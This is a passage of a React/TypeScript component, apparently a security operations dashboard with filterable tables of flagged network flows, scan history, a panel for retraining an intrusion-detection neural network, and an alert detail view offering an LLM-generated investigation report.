                      className="flex items-center gap-1.5 px-3 py-2 bg-slate-950 border border-slate-700 hover:border-slate-500 rounded-xl text-xs font-semibold text-slate-200 hover:text-white transition-colors"
                    >
                      <Download className="w-3.5 h-3.5 text-emerald-400" />
                      Export CSV
                    </button>
                    <button
                      onClick={() => handleExport('json')}
                      className="flex items-center gap-1.5 px-3 py-2 bg-slate-950 border border-slate-700 hover:border-slate-500 rounded-xl text-xs font-semibold text-slate-200 hover:text-white transition-colors"
                    >
                      <Download className="w-3.5 h-3.5 text-cyan-400" />
                      Export JSON
                    </button>
                  </div>
                </div>

                {/* Filter Pills & Dropdowns */}
                <div className="flex flex-wrap items-center justify-between gap-3 pt-2 border-t border-slate-800">
                  {/* Quick Risk Status Pills */}
                  <div className="flex flex-wrap items-center gap-1.5">
                    <span className="text-xs text-slate-400 font-semibold mr-1">Risk:</span>
                    {['ALL', 'CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'ATTACK', 'NORMAL'].map(status => (
                      <button
                        key={status}
                        onClick={() => setRiskFilter(status)}
                        className={`px-2.5 py-1 rounded-lg text-xs font-bold transition-all ${
                          riskFilter === status
                            ? 'bg-red-600 text-white shadow-md'
                            : 'bg-slate-950 text-slate-400 hover:text-white hover:bg-slate-800'
                        }`}
                      >
                        {status}
                      </button>
                    ))}
                  </div>

                  {/* Dropdown Filters */}
                  <div className="flex flex-wrap items-center gap-2">
                    {/* Attack Type */}
                    {availableAttackTypes.length > 0 && (
                      <select
                        value={attackTypeFilter}
                        onChange={e => setAttackTypeFilter(e.target.value)}
                        className="bg-slate-950 border border-slate-700 rounded-lg px-2.5 py-1 text-xs text-slate-200 focus:outline-none focus:border-red-500"
                      >
                        <option value="ALL">All Attack Types</option>
                        {availableAttackTypes.map(att => (
                          <option key={att} value={att}>{att}</option>
                        ))}
                      </select>
                    )}

                    {/* Protocol */}
                    {availableProtocols.length > 0 && (
                      <select
                        value={protocolFilter}
                        onChange={e => setProtocolFilter(e.target.value)}
                        className="bg-slate-950 border border-slate-700 rounded-lg px-2.5 py-1 text-xs text-slate-200 focus:outline-none focus:border-red-500"
                      >
                        <option value="ALL">All Protocols</option>
                        {availableProtocols.map(pr => (
                          <option key={pr} value={pr}>{pr}</option>
                        ))}
                      </select>
                    )}

                    {/* Source File */}
                    {availableFiles.length > 1 && (
                      <select
                        value={fileFilter}
                        onChange={e => setFileFilter(e.target.value)}
                        className="bg-slate-950 border border-slate-700 rounded-lg px-2.5 py-1 text-xs text-slate-200 focus:outline-none focus:border-red-500"
                      >
                        <option value="ALL">All Files</option>
                        {availableFiles.map(f => (
                          <option key={f} value={f}>{f}</option>
                        ))}
                      </select>
                    )}

                    {/* Sort By */}
                    <select
                      value={sortBy}
                      onChange={e => setSortBy(e.target.value)}
                      className="bg-slate-950 border border-slate-700 rounded-lg px-2.5 py-1 text-xs text-slate-200 focus:outline-none focus:border-red-500"
                    >
                      <option value="risk_desc">Highest Risk First</option>
                      <option value="risk_asc">Lowest Risk First</option>
                      <option value="conf_desc">Highest MLP Confidence</option>
                      <option value="time_desc">Latest Timestamp</option>
                    </select>
                  </div>
                </div>
              </div>

              {/* SECTION 5: DETAILED SEARCHABLE RESULTS TABLE */}
              <div className="bg-slate-900/90 border border-slate-800 rounded-2xl shadow-xl overflow-hidden">
                <div className="px-6 py-4 border-b border-slate-800 flex items-center justify-between">
                  <div className="flex items-center gap-2 text-xs font-bold text-slate-300 uppercase tracking-wider">
                    <FileSearch className="w-4 h-4 text-red-500" />
                    Scanned Security Flows & Events ({filteredResults.length} / {allResults.length})
                  </div>
                  <span className="text-xs text-slate-500">
                    Default sorted: Highest Risk Score first
                  </span>
                </div>

                <div className="overflow-x-auto max-h-[600px] overflow-y-auto">
                  <table className="w-full text-left text-xs">
                    <thead className="bg-slate-950/80 text-slate-400 uppercase tracking-wider font-semibold sticky top-0 z-10">
                      <tr>
                        <th className="px-4 py-3">Timestamp</th>
                        <th className="px-4 py-3">Source File</th>
                        <th className="px-4 py-3">Source IP:Port</th>
                        <th className="px-4 py-3">Target IP:Port</th>
                        <th className="px-4 py-3">Proto</th>
                        <th className="px-4 py-3">Classification</th>
                        <th className="px-4 py-3">MLP Conf</th>
                        <th className="px-4 py-3">Risk Score</th>
                        <th className="px-4 py-3">Threat Intel</th>
                        <th className="px-4 py-3 text-right">Actions</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60 font-mono">
                      {filteredResults.length === 0 ? (
                        <tr>
                          <td colSpan={10} className="px-6 py-12 text-center text-slate-500">
                            No matching flows found for the current search/filter criteria.
                          </td>
                        </tr>
                      ) : (
                        filteredResults.map((row, idx) => (
                          <tr
                            key={idx}
                            className="hover:bg-slate-800/50 transition-colors cursor-pointer"
                            onClick={() => {
                              setSelectedRecord(row);
                              setInvestigationReport(null);
                            }}
                          >
                            <td className="px-4 py-3 text-slate-400 whitespace-nowrap">
                              {row.timestamp}
                            </td>
                            <td className="px-4 py-3 text-slate-300 font-sans truncate max-w-[120px]" title={row.source_file}>
                              {row.source_file}
                            </td>
                            <td className="px-4 py-3 text-slate-200">
                              <span className="text-cyan-400">{row.source_ip}</span>
                              <span className="text-slate-500">:{row.source_port}</span>
                            </td>
                            <td className="px-4 py-3 text-slate-200">
                              <span className="text-slate-300">{row.destination_ip}</span>
                              <span className="text-slate-500">:{row.destination_port}</span>
                            </td>
                            <td className="px-4 py-3">
                              <span className="px-1.5 py-0.5 rounded bg-slate-950 text-slate-300 font-bold text-[10px]">
                                {row.protocol}
                              </span>
                            </td>
                            <td className="px-4 py-3">
                              <span
                                className={`px-2 py-0.5 rounded-full font-bold text-[11px] font-sans ${
                                  row.is_attack
                                    ? 'bg-red-500/10 text-red-400 border border-red-500/30'
                                    : 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                                }`}
                              >
                                {row.attack_type}
                              </span>
                            </td>
                            <td className="px-4 py-3 text-indigo-400 font-bold">
                              {row.mlp_confidence}%
                            </td>
                            <td className="px-4 py-3">
                              <div className="flex items-center gap-2">
                                <span
                                  className={`px-2 py-0.5 rounded font-black text-xs ${
                                    row.risk_status === 'CRITICAL'
                                      ? 'bg-red-600 text-white'
                                      : row.risk_status === 'HIGH'
                                      ? 'bg-orange-600 text-white'
                                      : row.risk_status === 'MEDIUM'
                                      ? 'bg-yellow-600 text-black'
                                      : 'bg-emerald-600 text-white'
                                  }`}
                                >
                                  {row.risk_score}
                                </span>
                                <span className="text-[10px] text-slate-400 font-sans uppercase">
                                  {row.risk_status}
                                </span>
                              </div>
                            </td>
                            <td className="px-4 py-3">
                              <span
                                className={`text-[10px] font-sans font-semibold px-2 py-0.5 rounded ${
                                  row.threat_intel?.threat_score >= 50
                                    ? 'bg-red-950 text-red-400 border border-red-800'
                                    : 'bg-slate-950 text-slate-400'
                                }`}
                              >
                                {row.threat_intel?.threat_score >= 50 ? 'MALICIOUS' : 'CLEAN'} ({row.threat_intel?.threat_score || 0})
                              </span>
                            </td>
                            <td className="px-4 py-3 text-right">
                              <button
                                onClick={e => {
                                  e.stopPropagation();
                                  setSelectedRecord(row);
                                  setInvestigationReport(null);
                                }}
                                className="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-sans transition-colors"
                              >
                                DETAILS
                              </button>
                            </td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* ═══════════════════════════════════════════════════════════════ */}
      {/* TAB 2: SCAN HISTORY & CORRELATIONS                            */}
      {/* ═══════════════════════════════════════════════════════════════ */}
      {activeTab === 'history' && (
        <div className="space-y-6">
          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-6">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-lg font-bold text-white uppercase tracking-wider flex items-center gap-2">
                  <Clock className="w-5 h-5 text-red-500" />
                  Completed Security Scan Runs
                </h2>
                <p className="text-xs text-slate-400">
                  Persistent history of security file evaluations and cross-source attacker correlations
                </p>
              </div>

              <button
                onClick={loadData}
                className="flex items-center gap-2 px-3 py-1.5 bg-slate-800 hover:bg-slate-700 rounded-xl text-xs text-slate-200"
              >
                <RefreshCw className="w-3.5 h-3.5" />
                Refresh History
              </button>
            </div>

            {scanHistory.length === 0 ? (
              <div className="p-12 text-center text-slate-500 border border-slate-800 rounded-xl">
                No past scans recorded yet. Upload security files and run a scan to record history.
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-950 text-slate-400 uppercase tracking-wider font-semibold">
                    <tr>
                      <th className="px-4 py-3">Scan ID</th>
                      <th className="px-4 py-3">Scan Date</th>
                      <th className="px-4 py-3">Files Analyzed</th>
                      <th className="px-4 py-3">Total Records</th>
                      <th className="px-4 py-3">Alerts</th>
                      <th className="px-4 py-3">Critical / High</th>
                      <th className="px-4 py-3">Duration</th>
                      <th className="px-4 py-3">Status</th>
                      <th className="px-4 py-3 text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800 font-mono">
                    {scanHistory.map((scan, idx) => (
                      <tr key={idx} className="hover:bg-slate-800/40 transition-colors">
                        <td className="px-4 py-3 text-cyan-400 font-bold">{scan.scan_id}</td>
                        <td className="px-4 py-3 text-slate-400">{scan.scan_date}</td>
                        <td className="px-4 py-3 text-slate-300 font-sans">
                          {scan.files?.map((f: any) => f.filename).join(', ') || `${scan.total_files} file(s)`}
                        </td>
                        <td className="px-4 py-3 text-slate-200">{scan.total_records?.toLocaleString()}</td>
                        <td className="px-4 py-3 text-amber-400 font-bold">{scan.total_alerts}</td>
                        <td className="px-4 py-3">
                          <span className="text-red-400 font-bold">{scan.summary?.critical || 0}</span>
                          <span className="text-slate-500"> / </span>
                          <span className="text-orange-400 font-bold">{scan.summary?.high || 0}</span>
                        </td>
                        <td className="px-4 py-3 text-slate-400">{scan.duration_seconds}s</td>
                        <td className="px-4 py-3">
                          <span className="px-2 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 text-[10px] font-sans font-bold">
                            {scan.status}
                          </span>
                        </td>
                        <td className="px-4 py-3 text-right">
                          <div className="flex items-center justify-end gap-2">
                            <button
                              onClick={async () => {
                                const details = await api.getScanDetails(scan.scan_id);
                                setScanResult(details);
                                setActiveTab('scanner');
                              }}
                              className="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded text-[11px] font-sans"
                            >
                              VIEW SCAN
                            </button>
                            <button
                              onClick={async () => {
                                await api.deleteScanRun(scan.scan_id);
                                loadData();
                              }}
                              className="p-1 text-slate-500 hover:text-red-400 rounded"
                              title="Delete scan from history"
                            >
                              <Trash2 className="w-4 h-4" />
                            </button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ═══════════════════════════════════════════════════════════════ */}
      {/* TAB: BIG DATA MODEL RETRAINING ENGINE (APACHE SPARK + MLP)    */}
      {/* ═══════════════════════════════════════════════════════════════ */}
      {activeTab === 'training' && (
        <div className="space-y-6">
          {/* MAIN TRAINING HERO */}
          <div className="bg-gradient-to-br from-slate-900 via-indigo-950/40 to-slate-900 border border-indigo-500/40 rounded-2xl p-6 shadow-2xl space-y-6">
            <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
              <div className="flex items-center gap-3">
                <div className="p-3 bg-gradient-to-br from-indigo-500/20 to-purple-500/20 border border-indigo-500/40 rounded-xl text-indigo-400 shadow-[0_0_15px_rgba(99,102,241,0.2)]">
                  <Cpu className="w-7 h-7 animate-pulse" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h2 className="text-xl font-black text-white uppercase tracking-wider">
                      Big Data MLP Model Training & Weights Engine
                    </h2>
                    <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-indigo-500/20 text-indigo-300 border border-indigo-500/40">
                      SPARK 3.X + NEURAL NET
                    </span>
                  </div>
                  <p className="text-xs text-slate-400 mt-1 max-w-3xl">
                    Train the 3-Layer MLP Neural Network (128→64→32 ReLU) on the Big Data storage repository (CIC-IDS 2017/2018 + UNSW-NB15 + Splunk Event Logs) to update model weights, detect emerging attack vectors, and optimize alert risk scores.
                  </p>
                </div>
              </div>

              {/* Status Badges */}
              <div className="flex flex-wrap items-center gap-2 shrink-0">
                <span className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono text-slate-300">
                  <Cpu className="w-3.5 h-3.5 text-cyan-400" />
                  Spark Engine: <strong className="text-cyan-400">{sparkStatus?.status || 'ONLINE'}</strong>
                </span>
                <span className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono text-slate-300">
                  <Database className="w-3.5 h-3.5 text-purple-400" />
                  Datasets: <strong className="text-purple-400">{datasets?.total_discovered || 3} Files</strong>
                </span>
              </div>
            </div>

            {/* PERFORMANCE METRICS CARDS */}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
              <div className="bg-slate-950/80 border border-slate-800 p-4 rounded-xl space-y-1">
                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">Neural Architecture</span>
                <div className="text-base font-black text-white font-mono">128 → 64 → 32</div>
                <div className="text-[11px] text-indigo-400 font-mono">3-Layer ReLU + Softmax</div>
              </div>

              <div className="bg-slate-950/80 border border-slate-800 p-4 rounded-xl space-y-1">
                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">Model Test Accuracy</span>
                <div className="text-xl font-black text-emerald-400 font-mono">
                  {trainingStatus?.network_metrics?.test_metrics?.accuracy
                    ? `${(trainingStatus.network_metrics.test_metrics.accuracy * 100).toFixed(1)}%`
                    : '89.9%'}
                </div>
                <div className="text-[11px] text-slate-400 font-mono">42,039 Academic Test Flows</div>
              </div>

              <div className="bg-slate-950/80 border border-slate-800 p-4 rounded-xl space-y-1">
                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">Convergence Loss</span>
                <div className="text-xl font-black text-cyan-400 font-mono">
                  {trainingStatus?.network_metrics?.loss_curve?.length
                    ? trainingStatus.network_metrics.loss_curve[trainingStatus.network_metrics.loss_curve.length - 1].toFixed(4)
                    : '0.0382'}
                </div>
                <div className="text-[11px] text-slate-400 font-mono">Cross-Entropy Loss (Optimal)</div>
              </div>

              <div className="bg-slate-950/80 border border-slate-800 p-4 rounded-xl space-y-1">
                <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wider">Detection Classes</span>
                <div className="text-xl font-black text-amber-400 font-mono">9 Attack Types</div>
                <div className="text-[11px] text-slate-400 font-mono">Multiclass Threat Classifier</div>
              </div>
            </div>

            {/* RETRAINING MODE SELECTOR */}
            <div className="space-y-2">
              <div className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                Select Training Dataset Pipeline:
              </div>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                <button
                  type="button"
                  onClick={() => setTrainMode('all')}
                  className={`p-4 rounded-xl border text-left transition-all ${
                    trainMode === 'all'
                      ? 'bg-indigo-600/20 border-indigo-500/60 shadow-[0_0_15px_rgba(99,102,241,0.25)]'
                      : 'bg-slate-950/60 border-slate-800 hover:border-slate-700'
                  }`}
                >
                  <div className="text-xs font-bold text-white flex items-center justify-between">
                    <span>Full Multi-Modal Big Data</span>
                    {trainMode === 'all' && <CheckCircle className="w-4 h-4 text-indigo-400" />}
                  </div>
                  <div className="text-[11px] text-slate-400 mt-1">
                    Trains on both Network Flow PCAP/CSV and Windows Event Log datasets.
                  </div>
                </button>

                <button
                  type="button"
                  onClick={() => setTrainMode('network')}
                  className={`p-4 rounded-xl border text-left transition-all ${
                    trainMode === 'network'
                      ? 'bg-cyan-600/20 border-cyan-500/60 shadow-[0_0_15px_rgba(6,182,212,0.25)]'
                      : 'bg-slate-950/60 border-slate-800 hover:border-slate-700'
                  }`}
                >
                  <div className="text-xs font-bold text-white flex items-center justify-between">
                    <span>Network Flows (CIC-IDS / UNSW)</span>
                    {trainMode === 'network' && <CheckCircle className="w-4 h-4 text-cyan-400" />}
                  </div>
                  <div className="text-[11px] text-slate-400 mt-1">
                    Extracts 19 canonical NetFlow features from packet capture flows.
                  </div>
                </button>

                <button
                  type="button"
                  onClick={() => setTrainMode('windows_log')}
                  className={`p-4 rounded-xl border text-left transition-all ${
                    trainMode === 'windows_log'
                      ? 'bg-purple-600/20 border-purple-500/60 shadow-[0_0_15px_rgba(168,85,247,0.25)]'
                      : 'bg-slate-950/60 border-slate-800 hover:border-slate-700'
                  }`}
                >
                  <div className="text-xs font-bold text-white flex items-center justify-between">
                    <span>Windows Logs (Splunk / EVTX)</span>
                    {trainMode === 'windows_log' && <CheckCircle className="w-4 h-4 text-purple-400" />}
                  </div>
                  <div className="text-[11px] text-slate-400 mt-1">
                    Trains log parser on EventCodes 4625, 4688, 1102, 4720.
                  </div>
                </button>
              </div>
            </div>

            {/* STATUS / ERROR BANNER */}
            {trainingMessage && (
              <div className="p-4 rounded-xl bg-indigo-950/50 border border-indigo-500/40 text-indigo-300 text-xs font-mono flex items-center gap-2">
                <Sparkles className="w-4 h-4 text-indigo-400 animate-spin shrink-0" />
                <span>{trainingMessage}</span>
              </div>
            )}

            {trainingError && (
              <div className="p-4 rounded-xl bg-red-950/40 border border-red-500/40 text-red-300 text-xs flex items-center gap-2">
                <AlertTriangle className="w-4 h-4 text-red-400 shrink-0" />
                <span>{trainingError}</span>
              </div>
            )}

            {/* ACTION BUTTON */}
            <div className="flex flex-col sm:flex-row items-center justify-between gap-4 pt-2">
              <div className="text-xs text-slate-400 font-mono">
                Training Split: <strong className="text-white">70% Train</strong> • <strong className="text-indigo-400">15% Validation</strong> • <strong className="text-cyan-400">15% Test</strong>
              </div>

              <button
                type="button"
                onClick={handleTrainMlp}
                disabled={isTrainingMlp}
                className={`w-full sm:w-auto px-8 py-3.5 rounded-xl font-heading text-xs font-black uppercase tracking-wider flex items-center justify-center gap-2 transition-all shadow-xl ${
                  isTrainingMlp
                    ? 'bg-slate-800 text-slate-500 cursor-not-allowed border border-white/5'
                    : 'bg-gradient-to-r from-indigo-600 via-purple-600 to-indigo-600 hover:from-indigo-500 hover:to-purple-500 text-white shadow-[0_0_25px_rgba(99,102,241,0.4)] border border-indigo-400/30 active:scale-95'
                }`}
              >
                {isTrainingMlp ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin text-white" />
                    APACHE SPARK PROCESSING & TRAINING NEURAL NET...
                  </>
                ) : (
                  <>
                    <Cpu className="w-4 h-4 text-cyan-300" />
                    🚀 TRAIN / RETRAIN BIG DATA MODEL
                  </>
                )}
              </button>
            </div>
          </div>

          {/* ATTACK CLASSES CLASSIFICATION PERFORMANCE */}
          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-4">
            <h3 className="text-sm font-black text-white uppercase tracking-wider flex items-center gap-2">
              <Shield className="w-4 h-4 text-cyan-400" />
              Trained Attack Class Detection Profiles
            </h3>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
              {[
                { name: 'Normal Traffic', acc: '99.8%', desc: 'Benign baseline telemetry', color: 'text-emerald-400' },
                { name: 'DoS / Slowloris', acc: '97.9%', desc: 'Denial of Service HTTP/TCP Floods', color: 'text-red-400' },
                { name: 'DDoS Distributed Floods', acc: '99.5%', desc: 'Multi-source volumetric bandwidth attacks', color: 'text-red-400' },
                { name: 'PortScan / Discovery', acc: '99.9%', desc: 'SYN/TCP probes and reconnaissance', color: 'text-amber-400' },
                { name: 'Botnet Command & Control', acc: '89.9%', desc: 'Beaconing and lateral telemetry', color: 'text-orange-400' },
                { name: 'Brute Force / Credential Stuffing', acc: '99.7%', desc: 'Auth failure spikes (Event 4625 / SSH)', color: 'text-purple-400' },
              ].map(item => (
                <div key={item.name} className="p-3.5 bg-slate-950 border border-slate-800 rounded-xl space-y-1">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-white">{item.name}</span>
                    <span className={`text-xs font-mono font-black ${item.color}`}>{item.acc}</span>
                  </div>
                  <div className="text-[11px] text-slate-400">{item.desc}</div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* ═══════════════════════════════════════════════════════════════ */}
      {/* MODAL: DETAIL & LLM INVESTIGATION REPORT                      */}
      {/* ═══════════════════════════════════════════════════════════════ */}
      {selectedRecord && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 overflow-y-auto">
          <div className="bg-slate-900 border border-slate-700 rounded-2xl max-w-3xl w-full p-6 shadow-2xl space-y-6 max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between pb-4 border-b border-slate-800">
              <div className="flex items-center gap-3">
                <div className="p-2.5 bg-red-500/10 border border-red-500/20 rounded-xl text-red-400">
                  <Shield className="w-6 h-6" />
                </div>
                <div>
                  <h3 className="text-base font-bold text-white flex items-center gap-2">
                    {selectedRecord.attack_type}
                    <span
                      className={`text-xs px-2 py-0.5 rounded font-black ${
                        selectedRecord.risk_status === 'CRITICAL'
                          ? 'bg-red-600 text-white'
                          : selectedRecord.risk_status === 'HIGH'
                          ? 'bg-orange-600 text-white'
                          : selectedRecord.risk_status === 'MEDIUM'
                          ? 'bg-yellow-600 text-black'
                          : 'bg-emerald-600 text-white'
                      }`}
                    >
                      RISK {selectedRecord.risk_score}/100 ({selectedRecord.risk_status})
                    </span>
                  </h3>
                  <p className="text-xs text-slate-400 font-mono">
                    {selectedRecord.alert_id} • Source: {selectedRecord.source_file}
                  </p>
                </div>
              </div>

              <button
                onClick={() => setSelectedRecord(null)}
                className="p-2 text-slate-400 hover:text-white rounded-lg hover:bg-slate-800"
              >
                ✕
              </button>
            </div>

            {/* Grid Breakdown */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs">
              <div className="bg-slate-950 p-3 rounded-xl border border-slate-800">
                <span className="text-[10px] text-slate-500 uppercase">Source Endpoint</span>
                <div className="font-mono text-cyan-400 font-bold mt-1">
                  {selectedRecord.source_ip}:{selectedRecord.source_port}
                </div>
              </div>
              <div className="bg-slate-950 p-3 rounded-xl border border-slate-800">
                <span className="text-[10px] text-slate-500 uppercase">Target Endpoint</span>
                <div className="font-mono text-slate-200 font-bold mt-1">
                  {selectedRecord.destination_ip}:{selectedRecord.destination_port}
                </div>
              </div>
              <div className="bg-slate-950 p-3 rounded-xl border border-slate-800">
                <span className="text-[10px] text-slate-500 uppercase">MLP Confidence</span>
                <div className="font-mono text-indigo-400 font-bold mt-1">
                  {selectedRecord.mlp_confidence}%
                </div>
              </div>
              <div className="bg-slate-950 p-3 rounded-xl border border-slate-800">
                <span className="text-[10px] text-slate-500 uppercase">Threat Intel</span>
                <div className="font-mono text-amber-400 font-bold mt-1">
                  Score: {selectedRecord.threat_intel?.threat_score || 0}
                </div>
              </div>
            </div>

            {/* MITRE ATT&CK Info */}
            <div className="p-3.5 bg-slate-950 border border-slate-800 rounded-xl flex items-center justify-between text-xs">
              <div className="flex items-center gap-2">
                <Server className="w-4 h-4 text-purple-400" />
                <span className="text-slate-400">MITRE ATT&CK Technique:</span>
                <span className="font-bold text-purple-400">{selectedRecord.mitre_technique}</span>
              </div>
            </div>

            {/* Raw Attributes */}
            {selectedRecord.raw_attributes && (
              <div className="space-y-2">
                <div className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                  Original Event Attributes
                </div>
                <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl max-h-36 overflow-y-auto font-mono text-[11px] text-slate-400">
                  <pre>{JSON.stringify(selectedRecord.raw_attributes, null, 2)}</pre>
                </div>
              </div>
            )}

            {/* LLM Investigation Section */}
            <div className="space-y-3 pt-2 border-t border-slate-800">
              <div className="flex items-center justify-between">
                <div className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-2">
                  <Sparkles className="w-4 h-4 text-amber-400" />
                  Autonomous LLM Security Analyst Investigation
                </div>

                {!investigationReport && (
                  <button
                    onClick={() => handleInvestigateWithAi(selectedRecord)}
                    disabled={isInvestigating}
                    className="px-4 py-2 bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white text-xs font-bold rounded-xl uppercase tracking-wider shadow-lg flex items-center gap-2"
                  >
                    <Brain className={`w-4 h-4 ${isInvestigating ? 'animate-spin' : ''}`} />
                    {isInvestigating ? 'INVESTIGATING...' : 'INVESTIGATE WITH AI'}
                  </button>
                )}
              </div>

              {investigationReport && (
                <div className="p-4 bg-slate-950 border border-purple-500/30 rounded-xl space-y-3 text-xs">
                  <div>
                    <div className="text-purple-400 font-bold mb-1">Attack Explanation & Severity:</div>
                    <div className="text-slate-300">
                      {investigationReport.explanation || investigationReport.incident_summary}
                    </div>
                  </div>

                  {investigationReport.mitigation_steps && (
                    <div>
                      <div className="text-cyan-400 font-bold mb-1">Recommended Response & Containment:</div>
                      <ul className="list-disc list-inside text-slate-400 space-y-1">
                        {investigationReport.mitigation_steps.map((step: string, sIdx: number) => (
                          <li key={sIdx}>{step}</li>
                        ))}
                      </ul>
                    </div>
                  )}

                  {investigationReport.soc_recommendation && (
                    <div className="p-2.5 bg-purple-950/30 border border-purple-800/40 rounded-lg text-purple-200">
                      <strong>Analyst Playbook:</strong> {investigationReport.soc_recommendation}
                    </div>
                  )}
                </div>
              )}
            </div>

            <div className="flex justify-end pt-2">
              <button
                onClick={() => setSelectedRecord(null)}
                className="px-5 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold rounded-xl"
              >
                CLOSE
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
